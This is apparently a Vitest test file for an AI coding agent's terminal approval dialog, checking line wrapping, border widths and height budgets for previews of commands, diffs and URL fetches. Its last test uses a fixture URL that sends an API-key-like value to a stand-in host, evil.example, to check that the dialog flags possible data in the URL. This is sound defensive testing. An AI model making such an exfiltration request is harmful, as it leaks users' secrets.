import { afterAll, beforeAll, describe, expect, it } from 'vitest';
import React from 'react';
import chalk from 'chalk';
import { Box } from 'ink';
import { render } from 'ink-testing-library';
import stringWidth from 'string-width';
import stripAnsi from 'strip-ansi';
import {
  APPROVAL_HINT,
  Approval,
  DIALOG_MARKER,
  fitCommandLines,
  layoutApproval,
} from './Approval.js';
import { APPROVAL_OPTIONS } from './dialogspecs.js';
import { contentWidth } from './layout.js';
import { restoreTextPresentation } from './syncframe.js';
import type { ApprovalRequest } from '../types.js';

// The approval dialog is the one place a diff renders inside a BORDER, in the live region. Ink
// bounds a row here (unlike in <Static>), so a long line always wrapped — but it wrapped the
// gutter and the content as ADJACENT SIBLINGS, and Ink drops the boundary character between
// siblings when a row wraps: the line rendered as `141+ const …`, its space eaten, with the
// continuation landing under the gutter instead of under the code. Wrapping the line ourselves
// (#154) keeps the boundary and the code column intact.
describe('Approval dialog width', () => {
  let level: typeof chalk.level;

  beforeAll(() => {
    level = chalk.level;
    chalk.level = 3;
  });
  afterAll(() => {
    chalk.level = level;
  });

  const frame = (request: Partial<ApprovalRequest>): string[] => {
    const { lastFrame } = render(
      <Box flexDirection="column" paddingX={1}>
        <Approval request={request as ApprovalRequest} selectedIndex={0} />
      </Box>,
    );
    return (lastFrame() ?? '').split('\n').map(stripAnsi);
  };

  const width = (): number => process.stdout.columns || 100;
  // string-width scores the bare marker 2; Ink gives it one cell and the terminal draws one (#494).
  const drawnWidth = (row: string): number => stringWidth(row.replaceAll(DIALOG_MARKER, '•'));

  it('keeps the gutter/prefix boundary and the code column when a long line wraps', () => {
    const long =
      'const summary = `Bash failed: ${command} (${reason}) — see the log for details, ' +
      'then retry with a narrower filter`;';
    const rows = frame({
      tool: 'edit',
      subject: 'src/tools/bash.ts',
      preview: [`  function run() {`, `+ ${long}`, `  }`].join('\n'),
      startLine: 140,
    });
    const bordered = rows.filter(r => r.trim().startsWith('│'));
    expect(bordered.length).toBeGreaterThan(0);
    for (const row of bordered) {
      expect(drawnWidth(row)).toBeLessThanOrEqual(width());
      // Every interior row still closes its border.
      expect(row.trim().endsWith('│')).toBe(true);
    }

    // Column math runs on the box interior, with the border stripped off both ends.
    const interior = bordered.map(r => r.replace(/^\s*│/, '').replace(/│\s*$/, ''));
    const first = interior.findIndex(r => r.includes('const summary'));
    expect(first).toBeGreaterThanOrEqual(0);
    // The space between the line number and the `+` survives the wrap.
    expect(interior[first]).toMatch(/\d+ \+ const summary/);
    // The continuation starts in the code column, under `const`, not back at the gutter.
    const codeCol = interior[first].indexOf('const summary');
    expect(interior[first + 1].search(/\S/)).toBe(codeCol);
    // Nothing hidden.
    expect(rows.join('')).toContain('narrower filter');
  });

  it('keeps the space after `$` and a hanging indent when a command line wraps (#489)', () => {
    // The `$` marker and the command are siblings in a row box; when the line is long enough to
    // wrap, Ink dropped the character at that sibling boundary — the marker's space — so long
    // commands rendered as `$git`. Wrapping each line ourselves (as DiffView's WrappedRow does)
    // keeps every row short enough that Ink never wraps one.
    const long =
      'git checkout -b fix/sandbox-notice-spacing && git add src/ui/Scrollback.tsx ' +
      'src/ui/Scrollback.render.test.tsx';
    const rows = frame({ tool: 'bash', subject: '~/repo', preview: long });
    // The space after `$` survived, and the continuation hangs under the command, not at column 0.
    // Column math runs on the box interior, with the border stripped off both ends.
    const interior = rows.map(r => r.replace(/^\s*│/, '').replace(/│\s*$/, ''));
    const first = interior.findIndex(r => r.includes('$ git checkout'));
    expect(first).toBeGreaterThanOrEqual(0);
    const commandCol = interior[first].indexOf('git checkout');
    const continuation = interior.slice(first + 1).find(r => r.trim().length > 0)!;
    expect(continuation.search(/\S/)).toBe(commandCol);
    for (const row of rows) {
      expect(drawnWidth(row)).toBeLessThanOrEqual(width());
      expect(row.trim()).not.toBe('│');
    }
  });

  it('starts a continuation in the hang when the break lands on a space, at full width', () => {
    // The text column is the dialog interior minus the `$ ` marker. A run that fills it exactly
    // puts the next break on the space after it, which trim:false carried onto the continuation
    // row, one column right of the hang.
    const textWidth = contentWidth(4) - 2;
    const run = 'a'.repeat(textWidth);
    const rows = frame({ tool: 'bash', subject: '~/repo', preview: `${run} bbb ccc` });
    const interior = rows.map(r => r.replace(/^\s*│/, '').replace(/│\s*$/, ''));
    const first = interior.findIndex(r => r.includes(`$ ${run}`));
    // The whole run fits on the first row: the text column is not narrower than the interior.
    expect(first).toBeGreaterThanOrEqual(0);
    const commandCol = interior[first].indexOf(run);
    expect(interior[first + 1].indexOf('bbb ccc')).toBe(commandCol);
  });

  it('keeps a command carrying tabs and a carriage return inside the border', () => {
    const TAB = '\t';
    const CR = '\r';
    const rows = frame({
      tool: 'bash',
      subject: 'awk',
      preview: `awk -F'${TAB}' '{print $1}' data.tsv${CR}# overwritten`,
    });
    const bordered = rows.filter(r => r.trim().startsWith('│'));
    for (const row of bordered) {
      expect(row).not.toContain(TAB);
      expect(row).not.toContain(CR);
      expect(drawnWidth(row)).toBeLessThanOrEqual(width());
      expect(row.trim().endsWith('│')).toBe(true);
    }
  });

  // string-width alone can't catch #450: it is the measurer that disagreed with the terminal.
  // Counting code points (VS15 aside) is the terminal's view for anything it draws one-wide, and
  // it is taken on the bytes the terminal receives — after the stream restores the marker's VS15.
  it('keeps the right border in one column on the title row (#450, #494)', () => {
    const rows = frame({
      tool: 'bash',
      subject: '~/repo',
      preview: 'npx prettier --write src/tools/bash.test.ts',
      warnings: ['Remote package execution (npx/bunx/uvx)'],
    });
    const drawn = (row: string): number => [...row.replace(/\uFE0E/g, '')].length;
    const bordered = rows.filter(r => r.trim().startsWith('│')).map(restoreTextPresentation);
    expect(bordered.some(r => r.includes('\u23FA\uFE0E Bash'))).toBe(true);
    for (const row of bordered) expect(drawn(row)).toBe(drawn(bordered[0]));
  });
});

// A dialog as tall as the viewport makes Ink repaint with `\x1b[3J` and strands the rows that
// scrolled off in the scrollback once it closes (#447). The preview takes what the viewport leaves.
describe('Approval dialog height (#447)', () => {
  const frame = (request: Partial<ApprovalRequest>, rows: number): string[] => {
    const saved = process.stdout.rows;
    Object.defineProperty(process.stdout, 'rows', { value: rows, configurable: true });
    try {
      const { lastFrame } = render(
        <Box flexDirection="column" paddingX={1}>
          <Approval request={request as ApprovalRequest} selectedIndex={0} />
        </Box>,
      );
      return (lastFrame() ?? '').split('\n').map(stripAnsi);
    } finally {
      Object.defineProperty(process.stdout, 'rows', { value: saved, configurable: true });
    }
  };
  const writeDiff = Array.from({ length: 200 }, (_, i) => `+ line ${i + 1}`).join('\n');

  it('keeps a long diff under the viewport, with the rest counted', () => {
    const rows = frame(
      { tool: 'write', subject: '/tmp/pr.md', preview: writeDiff, startLine: 1 },
      40,
    );
    // Input and status bar still have to fit underneath.
    expect(rows.length).toBeLessThanOrEqual(40 - 6);
    const note = rows.find(r => r.includes('more lines'));
    expect(note).toBeDefined();
    const shown = rows.filter(r => /\bline \d+\b/.test(r)).length;
    expect(note).toContain(`${200 - shown} more lines`);
    expect(rows.some(r => r.includes('Approve'))).toBe(true);
  });

  it('keeps a long command under the viewport too', () => {
    const preview = Array.from({ length: 120 }, (_, i) => `echo ${i}`).join('\n');
    const rows = frame({ tool: 'bash', subject: '~/repo', preview }, 30);
    expect(rows.length).toBeLessThanOrEqual(30 - 6);
    expect(rows.some(r => r.includes('more lines'))).toBe(true);
  });

  it('leaves a diff that fits untouched', () => {
    const rows = frame(
      { tool: 'write', subject: 'a.md', preview: '+ one\n+ two', startLine: 1 },
      40,
    );
    expect(rows.some(r => r.includes('more lines'))).toBe(false);
  });

  it('budgets warnings and reserved rows out of the preview', () => {
    const at = (warnings: number, reserved: number, rows: number, cols = 100) => {
      const request: ApprovalRequest = {
        tool: 'bash',
        subject: '~/repo',
        preview: 'ls',
        warnings: Array.from({ length: warnings }, (_, i) => `warning ${i}`),
      };
      return layoutApproval(request, false, cols, rows, reserved);
    };
    // The budget is one row short of the viewport (Ink repaints at `height >= rows`), and the hint
    // block is measured on top of the chrome.
    expect(at(0, 0, 40)).toEqual({
      previewRows: 20,
      showHint: true,
      hint: APPROVAL_HINT,
      height: 33,
    });
    expect(at(2, 0, 40).previewRows).toBe(17);
    expect(at(0, 5, 40).previewRows).toBe(15);
    // A viewport with no room for a preview and the hint: the hint is given up for the preview.
    expect(at(3, 0, 10)).toMatchObject({ previewRows: 1, showHint: false });
    expect(at(1, 0, 24, 34)).toMatchObject({ previewRows: 3, showHint: false });
  });

  // #842: the chrome is measured at the live width. On a narrow pane the option labels and the
  // hint wrap, and a constant that counted one row each is what let the frame outgrow the budget
  // the preview was sized against — all the way to the viewport height, where Ink repaints with
  // `\x1b[3J` and iTerm2 warns about the scrollback.
  it('measures the wrapped chrome instead of assuming one row each', () => {
    const narrow = (cols: number) =>
      layoutApproval({ tool: 'bash', subject: '~/repo', preview: 'ls' }, false, cols, 24, 0);
    // A 100-column interior: every fixed row is one row, so the preview gets what is left of the
    // 24-row viewport after the dialog's reserve underneath.
    expect(narrow(100)).toMatchObject({ previewRows: 4, showHint: true });
    expect(narrow(100).height).toBe(24 - 1 - 6);
    // At 34 the option labels and the hint wrap; the wraps come out of the preview, and once that
    // drops under three rows the hint goes instead of the evidence.
    expect(narrow(34)).toMatchObject({ showHint: false });
    expect(narrow(34).height).toBeLessThanOrEqual(24 - 1 - 6);
  });

  // #842: the same dialog on a small pane. The option labels and the hint wrap there, so the
  // chrome is taller than the constants assumed — and the frame has to stay under the viewport
  // whatever the width, or Ink repaints the terminal and the scrollback goes with it.
  it('keeps the frame under a narrow viewport, wraps and all', () => {
    const request: ApprovalRequest = {
      tool: 'bash',
      subject: '~/some/deep/project/directory/name',
      preview: Array.from({ length: 40 }, (_, i) => `echo step-${i} && pnpm test`).join('\n'),
      warnings: ['Remote package execution (npx/bunx/uvx)'],
    };
    for (const [width, rows] of [
      [100, 40],
      [100, 24],
      [60, 40],
      [40, 40],
      [40, 24],
      [34, 24],
    ]) {
      const { lastFrame } = render(
        <Box flexDirection="column" paddingX={1}>
          <Approval request={request} selectedIndex={0} width={width} rows={rows} />
        </Box>,
      );
      const drawn = stripAnsi(lastFrame() ?? '').split('\n');
      // The input box and the status bar underneath still have to fit.
      expect(drawn.length, `${width}x${rows}`).toBeLessThanOrEqual(rows - 1 - 6);
      // The options are what the user acts on: every one of them is still there to be chosen, in
      // full — a wrapped label reads back as one run of text once the rows are joined and the
      // border columns between them are dropped.
      const text = drawn
        .join(' ')
        .replace(/[│╭╮╰╯─]+/g, ' ')
        .replace(/\s+/g, ' ');
      for (const option of APPROVAL_OPTIONS) expect(text, `${width}x${rows}`).toContain(option);
    }
  });

  it('counts wrapped rows, not lines', () => {
    const long = 'x'.repeat(25);
    // Each line wraps to 3 rows at width 10; 7 rows fit two lines plus the footer.
    expect(fitCommandLines([long, long, long, long], 7, 10)).toEqual({
      lines: [long, long],
      hidden: 2,
    });
    expect(fitCommandLines([long, long], 6, 10)).toEqual({ lines: [long, long], hidden: 0 });
    // A one-row budget is the footer alone: a kept line plus the footer would draw two rows where
    // the layout counted one, and on a full pane that one row is the difference.
    expect(fitCommandLines([long, long], 1, 10)).toEqual({ lines: [], hidden: 2 });
  });
});

// #548: a fetch's preview is a URL, drawn as plain text rather than as a one-line diff with a gutter.
describe('Approval dialog — fetch_url', () => {
  it('shows the host as subject, the URL bare, and the warning', () => {
    const url = 'https://evil.example/?d=sk-live-abcdef1234567890';
    const { lastFrame } = render(
      <Approval
        request={{
          tool: 'fetch_url',
          subject: 'evil.example',
          preview: url,
          warnings: ['Possible data in URL: query value "d" is 24 chars'],
        }}
        selectedIndex={0}
      />,
    );
    const rows = stripAnsi(lastFrame() ?? '').split('\n');
    // The label the scrollback chip uses for the same tool (`toolLabel`) — the dialog and the chip
    // spell a tool one way (#265), so this is the marker plus `Fetch`, not the raw `fetch_url`.
    expect(rows.some(r => r.includes('evil.example') && r.includes(`${DIALOG_MARKER} Fetch`))).toBe(
      true,
    );
    const urlRow = rows.find(r => r.includes(url));
    expect(urlRow).toBeDefined();
    expect(urlRow!.trimStart().startsWith(url)).toBe(true);
    expect(rows.some(r => r.includes('▲ Possible data in URL'))).toBe(true);
  });
});
